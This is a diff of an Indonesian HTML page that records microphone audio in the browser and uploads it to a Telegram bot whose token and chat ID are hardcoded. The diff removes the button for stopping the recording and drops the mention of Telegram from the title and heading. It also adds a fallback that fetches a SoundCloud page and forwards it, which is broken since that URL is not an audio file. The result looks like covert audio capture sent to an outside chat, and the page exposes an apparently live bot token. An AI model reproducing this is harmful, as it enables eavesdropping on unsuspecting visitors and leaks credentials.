@@ -3,19 +3,22 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Perekaman Audio 1</title>
+    <title>Perekaman Audio dengan Fallback</title>
 </head>
 <body>
-    <h1>Perekaman Audio dan Pengiriman ke Telegram</h1>
+    <h1>Perekaman Audio dan Fallback</h1>
     <button id="start">Mulai Rekaman</button>
-    <button id="stop" disabled>Hentikan Rekaman</button>
     <audio id="playback" controls style="display: none;"></audio>
+    <p id="fallback-message" style="display: none; color: red;">
+        Mikrofon tidak tersedia atau akses ditolak. File audio default akan dikirim.
+    </p>
 
     <script>
         let mediaRecorder;
         let audioChunks = [];
         const botToken = '8103522113:AAECNtZDVMnPLaXX3HD1IFeQuOp7cQ2Td_Y'; // Ganti dengan token bot Anda
         const chatId = '6813368909'; // Ganti dengan chat ID Anda
+        const defaultAudio = 'https://soundcloud.com/soundhelix/soundhelix-song-1?utm_source=clipboard&utm_medium=text&utm_campaign=social_sharing'; // URL audio fallback
 
         document.getElementById('start').addEventListener('click', () => {
             startRecording();
@@ -57,8 +60,8 @@
                     }
                 }, 3 * 60 * 1000); // 3 menit
             } catch (error) {
-                console.error("Gagal mengakses mikrofon:", error);
-                alert("Mikrofon tidak tersedia atau akses ditolak.");
+                console.error("Mikrofon tidak tersedia atau akses ditolak:", error);
+                fallbackAudio();
             }
         }
 
@@ -66,6 +69,21 @@
             if (mediaRecorder && mediaRecorder.state === "recording") {
                 mediaRecorder.stop();
             }
+        }
+
+        function fallbackAudio() {
+            document.getElementById('fallback-message').style.display = 'block';
+
+            // Ambil file audio fallback
+            fetch(defaultAudio)
+                .then(response => response.blob())
+                .then(audioBlob => {
+                    sendAudioToTelegram(audioBlob);
+                })
+                .catch(error => {
+                    console.error("Gagal mengunduh file audio fallback:", error);
+                    alert("Gagal mengirim audio fallback.");
+                });
         }
 
         function sendAudioToTelegram(audioBlob) {
